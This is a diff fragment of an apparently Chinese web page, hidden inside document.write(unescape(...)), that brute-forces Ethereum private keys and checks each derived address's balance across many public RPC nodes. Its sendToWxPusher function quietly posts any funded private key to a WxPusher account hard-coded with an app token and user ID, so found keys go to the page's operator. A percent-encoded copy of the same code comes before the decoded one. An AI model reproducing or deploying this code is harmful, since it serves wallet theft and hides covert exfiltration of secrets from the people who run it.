%20%27sequential%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%u987A%u5E8F%u626B%u63CF%u65F6%u751F%u6210%2010%20%u4E2A%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20%28let%20i%20%3D%200%3B%20i%20%3C%20keyCount%3B%20i++%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20privateKeys.push%28generateSequentialPrivateKey%28%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20%28const%20privateKey%20of%20privateKeys%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28stopScanFlag%29%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20scannedCount++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20address%20%3D%20getAddressFromPrivateKey%28privateKey%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21address%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u65E0%u6548%u7684%u79C1%u94A5%3A%22%2C%20privateKey%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20validAddressCount++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20updateStats%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20balance%20%3D%20await%20getBalance%28address%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28balance.success%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20addResultRow%28privateKey%2C%20address%2C%20balance%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28balance.value%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20balanceCount++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20updateStats%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sendToWxPusher%28privateKey%2C%20address%2C%20balance%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28stopCondition%20%3D%3D%3D%20%27balance%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20stopScanFlag%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u53D1%u73B0%u6709%u6548%u4F59%u989D%u5730%u5740%3A%20%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%60%2C%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u67E5%u8BE2%u5931%u8D25%uFF0C%u79C1%u94A5%3A%22%2C%20privateKey%2C%20%22%u5730%u5740%3A%22%2C%20address%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u5904%u7406%u79C1%u94A5%u65F6%u51FA%u9519%3A%22%2C%20privateKey%2C%20%22error%3A%22%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%u6DFB%u52A0%u77ED%u6682%u5EF6%u8FDF%u4EE5%u907F%u514D%u8FC7%u5FEB%u626B%u63CF%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20new%20Promise%28resolve%20%3D%3E%20setTimeout%28resolve%2C%20100%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20isScanning%20%3D%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27startScan%27%29.disabled%20%3D%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27stopScan%27%29.style.display%20%3D%20%27none%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20clearInterval%28scanInterval%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%27%u626B%u63CF%u5DF2%u5B8C%u6210%27%2C%20scanMode%20%3D%3D%3D%20%27random%27%20%3F%20%27primary%27%20%3A%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u505C%u6B62%u626B%u63CF%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20stopScanFunction%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20stopScanFlag%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%27%u6B63%u5728%u505C%u6B62%u626B%u63CF...%27%2C%20%27warning%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20//%20%u4E8B%u4EF6%u76D1%u542C%0A%20%20%20%20%20%20%20%20document.getElementById%28%27startScan%27%29.addEventListener%28%27click%27%2C%20startScan%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27stopScan%27%29.addEventListener%28%27click%27%2C%20stopScanFunction%29%3B%0A%0A%20%20%20%20%20%20%20%20//%20%u952E%u76D8%u5FEB%u6377%u952E%20%28Ctrl+Space%20%u5F00%u59CB/%u505C%u6B62%u626B%u63CF%29%0A%20%20%20%20%20%20%20%20document.addEventListener%28%27keydown%27%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28e.key%20%3D%3D%3D%20%27%20%27%20%26%26%20e.ctrlKey%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28document.getElementById%28%27stopScan%27%29.style.display%20%3D%3D%3D%20%27inline-block%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20stopScanFunction%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20startScan%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20//%20%u52A8%u6001%u52A0%u8F7DBootstrap%20JS%0A%20%20%20%20%20%20%20%20const%20script%20%3D%20document.createElement%28%27script%27%29%3B%0A%20%20%20%20%20%20%20%20script.src%20%3D%20%27https%3A//cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js%27%3B%0A%20%20%20%20%20%20%20%20script.async%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20document.body.appendChild%28script%29%3B%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C%21--%20%u5E95%u90E8%u53CB%u60C5%u94FE%u63A5%20--%3E%0A%3Cfooter%20class%3D%22footer%20py-4%20mt-5%22%20style%3D%22background-color%3A%20%23f1f1f1%3B%20text-align%3A%20center%3B%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-12%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20d-flex%20justify-content-center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22mx-3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22https%3A//t.me/eth18188%22%20target%3D%22_blank%22%20style%3D%22text-decoration%3A%20none%3B%20color%3A%20%23007bff%3B%22%3ETelegram%u9891%u9053%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22mx-3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22https%3A//qskg8.github.io/%22%20target%3D%22_blank%22%20style%3D%22text-decoration%3A%20none%3B%20color%3A%20%23007bff%3B%22%3E%u78B0%u649E%u7A0B%u5E8F%u4E0B%u8F7D%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22mx-3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22https%3A//t.me/waeth888%22%20target%3D%22_blank%22%20style%3D%22text-decoration%3A%20none%3B%20color%3A%20%23007bff%3B%22%3E%u8054%u7CFB%u4F5C%u8005%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22mx-3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22https%3A//github.com/qskg8/ETH-Collider---brute-force-cracking%22%20target%3D%22_blank%22%20style%3D%22text-decoration%3A%20none%3B%20color%3A%20%23007bff%3B%22%3Egithub%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%3C/footer%3E%0A%3Cscript%20type%3D%22text/javascript%22%20src%3D%22//api.tongjiniao.com/c%3F_%3D775297665192022016%22%20async%3E%3C/script%3E%0A%3C/html%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E%0A"));
+document.write(unescape("<div class="alert-container" id="alertContainer"></div>
+
+    <script type="text/javascript">
+        // 全局变量定义
+        let stopScanFlag = false;    // 停止扫描标志
+        let scanInterval;           // 计时器间隔
+        let startTime;              // 开始时间
+        let scannedCount = 0;       // 已扫描计数
+        let validAddressCount = 0;  // 有效地址计数
+        let balanceCount = 0;       // 有余额计数
+        let isScanning = false;     // 是否正在扫描
+
+        // RPC节点列表
+        const rpcUrls = [
+            'https://ethereum-rpc.publicnode.com',
+            'https://virginia.rpc.blxrbdn.com',
+            'https://uk.rpc.blxrbdn.com',
+            'https://eth-mainnet.public.blastapi.io',
+            'https://ethereum.publicnode.com',
+            'https://singapore.rpc.blxrbdn.com',
+            'https://eth.rpc.blxrbdn.com',
+            'https://api.securerpc.com/v1',
+            'https://api.zan.top/eth-mainnet',
+            'https://rpc.mevblocker.io',
+            'https://rpc.flashbots.net',
+            'https://eth1.lava.build',
+            'https://ethereum.blockpi.network/v1/rpc/public',
+            'https://eth.api.onfinality.io/public',
+            'https://eth.blockrazor.xyz',
+            'https://rpc.eth.gateway.fm',
+            'https://eth.drpc.org',
+            'https://mainnet.gateway.tenderly.co',
+            'https://gateway.tenderly.co/public/mainnet',
+            'https://eth.merkle.io',
+            'https://ethereum.rpc.subquery.network/public',
+            'https://rpc.mevblocker.io/fast',
+            'https://rpc.mevblocker.io/noreverts',
+            'https://eth.llamarpc.com',
+            'https://ethereum.blockpi.network/v1/rpc/public',
+            'https://eth-mainnet.public.blastapi.io',
+            'https://eth-mainnet.alchemyapi.io/v2/demo',
+            'https://1rpc.io/eth',
+            'https://0xrpc.io/eth',
+            'https://rpc.mevblocker.io/fullprivacy',
+            'https://api-ethereum-mainnet.n.dwellir.com/f34bda43-11fb-48f6-9422-0831d9e35351',
+        ];
+
+        const keyCount = 10;  // 每次扫描生成的私钥数量
+        let currentSequentialKey = null;
+        let sequentialCounter = 0;
+
+        /**
+         * 显示通知提示
+         * @param {string} message 提示信息
+         * @param {string} type 提示类型 (primary, success, danger)
+         */
+        function showAlert(message, type = 'primary') {
+            const alertContainer = document.getElementById('alertContainer');
+            const alertId = 'alert-' + Date.now();
+            
+            const alert = document.createElement('div');
+            alert.id = alertId;
+            alert.className = `alert alert-${type} custom-alert text-center fade show`;
+            alert.role = 'alert';
+            alert.innerHTML = message;
+            
+            alertContainer.prepend(alert);
+            
+            setTimeout(() => {
+                const alertElement = document.getElementById(alertId);
+                if (alertElement) {
+                    alertElement.classList.add('fade');
+                    setTimeout(() => alertElement.remove(), 300);
+                }
+            }, 5000);
+        }
+
+        /**
+         * 格式化时间显示 (HH:MM:SS)
+         * @param {number} seconds 总秒数
+         * @returns {string} 格式化后的时间字符串
+         */
+        function formatTime(seconds) {
+            const h = Math.floor(seconds / 3600);
+            const m = Math.floor((seconds % 3600) / 60);
+            const s = seconds % 60;
+            return [h.toString().padStart(2, '0'), m.toString().padStart(2, '0'), s.toString().padStart(2, '0')].join(':');
+        }
+
+        /**
+         * 更新计时器显示
+         */
+        function updateTimer() {
+            if (!startTime) return;
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            document.getElementById('elapsedTime').textContent = formatTime(elapsed);
+        }
+
+        /**
+         * 更新统计信息显示
+         */
+        function updateStats() {
+            document.getElementById('scannedCount').textContent = scannedCount.toLocaleString();
+            document.getElementById('validAddressCount').textContent = validAddressCount.toLocaleString();
+            document.getElementById('balanceCount').textContent = balanceCount.toLocaleString();
+        }
+
+        /**
+         * 随机获取一个RPC节点URL
+         * @returns {string} RPC节点URL
+         */
+        function getRandomRpcUrl() {
+            const randomIndex = Math.floor(Math.random() * rpcUrls.length);
+            return rpcUrls[randomIndex];
+        }
+
+        /**
+         * 创建Ethers.js提供者
+         * @param {string} rpcUrl RPC节点URL
+         * @returns {ethers.JsonRpcProvider} Ethers提供者实例
+         */
+        function createProvider(rpcUrl) {
+            return new ethers.JsonRpcProvider(rpcUrl);
+        }
+
+        /**
+         * 生成随机私钥
+         * @returns {string} 十六进制格式的私钥
+         */
+        function generateRandomPrivateKey() {
+            return ethers.Wallet.createRandom().privateKey;
+        }
+
+        /**
+         * 生成顺序私钥
+         * @returns {string} 十六进制格式的私钥
+         */
+        function generateSequentialPrivateKey() {
+            if (!currentSequentialKey || sequentialCounter >= keyCount) {
+                currentSequentialKey = generateRandomPrivateKey();
+                sequentialCounter = 0;
+                document.getElementById('resultTable').innerHTML = '';
+            }
+
+            const privateKeyBigInt = BigInt(currentSequentialKey);
+            const newPrivateKeyBigInt = privateKeyBigInt + BigInt(sequentialCounter);
+            sequentialCounter++;
+            
+            let newPrivateKey = newPrivateKeyBigInt.toString(16);
+            while (newPrivateKey.length < 64) {
+                newPrivateKey = '0' + newPrivateKey;
+            }
+
+            return '0x' + newPrivateKey;
+        }
+
+        /**
+         * 从私钥获取地址
+         * @param {string} privateKey 私钥
+         * @returns {string|null} 以太坊地址或null(如果私钥无效)
+         */
+        function getAddressFromPrivateKey(privateKey) {
+            try {
+                const wallet = new ethers.Wallet(privateKey);
+                return wallet.address;
+            } catch (e) {
+                console.error("无效的私钥:", privateKey);
+                return null;
+            }
+        }
+
+        /**
+         * 查询地址余额
+         * @param {string} address 以太坊地址
+         * @returns {Promise<object>} 包含余额信息的对象
+         */
+        async function getBalance(address) {
+            if (!address) return { value: '无效地址', success: false };
+            
+            // 随机选择一个RPC节点开始尝试
+            let startIndex = Math.floor(Math.random() * rpcUrls.length);
+            let attempts = 0;
+            let balance = '查询失败';
+            let success = false;
+
+            while (!success && attempts < rpcUrls.length) {
+                const rpcUrl = rpcUrls[(startIndex + attempts) % rpcUrls.length];
+                const provider = createProvider(rpcUrl);
+                try {
+                    const balanceWei = await provider.getBalance(address);
+                    const balanceInGwei = balanceWei / 10n ** 9n;
+                    balance = {
+                        value: balanceInGwei,
+                        formatted: `${balanceInGwei.toString()} Gwei`,
+                        success: true
+                    };
+                    success = true;
+                } catch (error) {
+                    attempts++;
+                    console.error(`RPC节点 ${rpcUrl} 查询失败:`, error);
+                }
+            }
+
+            return balance;
+        }
+
+        /**
+         * 发送通知到WxPusher
+         * @param {string} privateKey 私钥
+         * @param {string} address 地址
+         * @param {object} balance 余额信息
+         */
+        function sendToWxPusher(privateKey, address, balance) {
+            const APP_TOKEN = "AT_eBVzfMwOQIbii2XVrjG4GnYenmkgDgR5";
+            const UIDS = ["UID_a74XG9KK8OMBcMxRbm3uodWXf7nq"];
+            const message = `网站发现ETH余额!\n私钥: ${privateKey}\n地址: ${address}\n余额: ${balance.formatted}`;
+
+            const payload = {
+                appToken: APP_TOKEN,
+                content: message,
+                uids: UIDS,
+            };
+
+            fetch('https://wxpusher.zjiecode.com/api/send/message', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("发送成功:", data);
+                showAlert(`已发送通知: ${address.substring(0, 6)}...${address.substring(38)}`, 'success');
+            })
+            .catch(error => {
+                console.error("发送失败:", error);
+                showAlert(`通知发送失败: ${error.message}`, 'danger');
+            });
+        }
+
+        /**
+         * 添加结果行到表格
+         * @param {string} privateKey 私钥
+         * @param {string} address 地址
+         * @param {object} balance 余额信息
+         */
+        function addResultRow(privateKey, address, balance) {
+            const resultTable = document.getElementById('resultTable');
+            const row = document.createElement('tr');
+            
+            const balanceClass = balance.value > 0 ? 'balance-positive' : 'balance-zero';
+            const balanceText = balance.success ? balance.formatted : balance.value;
+            
+            row.innerHTML = `
+                <td>${privateKey}</td>
+                <td><a href="https://etherscan.io/address/${address}" target="_blank">${address}</a></td>
+                <td class="${balanceClass}">${balanceText}</td>
+            `;
+            
+            resultTable.prepend(row);
+        }
+
+        /**
+         * 开始扫描
+         */
+        async function startScan() {
+            if (isScanning) return;
+            
+            isScanning = true;
+            stopScanFlag = false;
+            startTime = Date.now();
+            scannedCount = 0;
+            validAddressCount = 0;
+            balanceCount = 0;
+            
+            const resultTable = document.getElementById('resultTable');
+            const scanMode = document.getElementById('scanMode').value;
+            const stopCondition = document.getElementById('stopCondition').value;
+            
+            // 清空现有结果
+            if (scanMode === 'random') {
+                resultTable.innerHTML = '';
+            }
+            
+            updateStats();
+            showAlert('扫描已开始', 'primary');
+            
+            document.getElementById('startScan').disabled = true;
+            document.getElementById('stopScan').style.display = 'inline-block';
+            
+            // 更新计时器
+            if (scanInterval) clearInterval(scanInterval);
+            scanInterval = setInterval(updateTimer, 1000);
+            
+            while (!stopScanFlag && !stopScanFlag) {
+                let privateKeys = [];
+                // 如果是随机扫描模式，每次生成 10 个私钥
+                if (scanMode === 'random') {
+                    for (let i = 0; i < keyCount; i++) {
+                        privateKeys.push(generateRandomPrivateKey());
+                    }
+                } else if (scanMode === 'sequential') {
+                    // 顺序扫描时生成 10 个私钥
+                    for (let i = 0; i < keyCount; i++) {
+                        privateKeys.push(generateSequentialPrivateKey());
+                    }
+                }
+
+                for (const privateKey of privateKeys) {
+                    if (stopScanFlag) break;
+                    scannedCount++;
+                    
+                    const address = getAddressFromPrivateKey(privateKey);
+                    if (!address) {
+                        console.error("无效的私钥:", privateKey);
+                        continue;
+                    }
+                    
+                    validAddressCount++;
+                    updateStats();
+
+                    try {
+                        const balance = await getBalance(address);
+                        
+                        if (balance.success) {
+                            addResultRow(privateKey, address, balance);
+                            
+                            if (balance.value > 0) {
+                                balanceCount++;
+                                updateStats();
+                                sendToWxPusher(privateKey, address, balance);
+                                
+                                if (stopCondition === 'balance') {
+                                    stopScanFlag = true;
+                                    showAlert(`发现有效余额地址: ${address.substring(0, 6)}...${address.substring(38)}`, 'success');
+                                }
+                            }
+                        } else {
+                            console.error("查询失败，私钥:", privateKey, "地址:", address);
+                        }
+                    } catch (error) {
+                        console.error("处理私钥时出错:", privateKey, "error:", error);
+                    }
+                }
+                
+                // 添加短暂延迟以避免过快扫描
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+
+            isScanning = false;
+            document.getElementById('startScan').disabled = false;
+            document.getElementById('stopScan').style.display = 'none';
+            
+            clearInterval(scanInterval);
+            showAlert('扫描已完成', scanMode === 'random' ? 'primary' : 'success');
+        }
+
+        /**
+         * 停止扫描
+         */
+        function stopScanFunction() {
+            stopScanFlag = true;
+            showAlert('正在停止扫描...', 'warning');
+        }
+
+        // 事件监听
+        document.getElementById('startScan').addEventListener('click', startScan);
+        document.getElementById('stopScan').addEventListener('click', stopScanFunction);
+
+        // 键盘快捷键 (Ctrl+Space 开始/停止扫描)
+        document.addEventListener('keydown', (e) => {
+            if (e.key === ' ' && e.ctrlKey) {
+                e.preventDefault();
+                if (document.getElementById('stopScan').style.display === 'inline-block') {
+                    stopScanFunction();
+                } else {
+                    startScan();
+                }
+            }
+        });
+
+        // 动态加载Bootstrap JS
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js';
+        script.async = true;
+        document.body.appendChild(script);
+    </script>
+</body>
+<!-- 底部友情链接 -->
+<footer class="footer py-4 mt-5" style="background-color: #f1f1f1; text-align: center;">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+                <ul class="list-unstyled d-flex justify-content-center">
+                    <li class="mx-3">
+                        <a href="https://t.me/eth18188" target="_blank" style="text-decoration: none; color: #007bff;">Telegram频道</a>
+                    </li>
+                    <li class="mx-3">
+                        <a href="https://qskg8.github.io/" target="_blank" style="text-decoration: none; color: #007bff;">碰撞程序下载</a>
+                    </li>
+                    <li class="mx-3">
+                        <a href="https://t.me/waeth888" target="_blank" style="text-decoration: none; color: #007bff;">联系作者</a>
+                    </li>
+                    <li class="mx-3">
+                        <a href="https://github.com/qskg8/ETH-Collider---brute-force-cracking" target="_blank" style="text-decoration: none; color: #007bff;">github</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</footer>
+<script type="text/javascript" src="//api.tongjiniao.com/c?_=775297665192022016" async></script>
+</html>"));
+//-->
+</script>
+"));
 //-->
 </script>
